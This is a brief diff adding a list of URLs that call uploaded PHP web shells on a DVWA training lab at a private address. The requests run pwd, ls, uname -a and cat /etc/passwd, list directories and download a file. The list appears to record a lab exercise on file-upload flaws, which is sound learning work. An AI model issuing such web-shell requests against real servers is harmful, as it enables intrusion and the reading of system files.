@@ -1,0 +1,11 @@
+http://192.168.1.115/dvwa/hackable/uploads/
+
+http://192.168.1.115/dvwa/hackable/uploads/shell.php?cmd=pwd
+http://192.168.1.115/dvwa/hackable/uploads/shell.php?cmd=ls
+http://192.168.1.115/dvwa/hackable/uploads/shell.php?cmd=whoiam
+http://192.168.1.115/dvwa/hackable/uploads/shell.php?cmd=uname -a
+http://192.168.1.115/dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd
+http://192.168.1.115/dvwa/hackable/uploads/shellAvanzata.php?cmd=ls%20/home
+http://192.168.1.115/dvwa/hackable/uploads/shellAvanzata.php?dir=/var/www/html
+http://192.168.1.115/dvwa/hackable/uploads/shellAvanzata.php?download=/var/www/dvwa/hackable/uploads/dvwa_email.png
+http://192.168.1.115/dvwa/hackable/uploads/shellAvanzata.php?cmd=
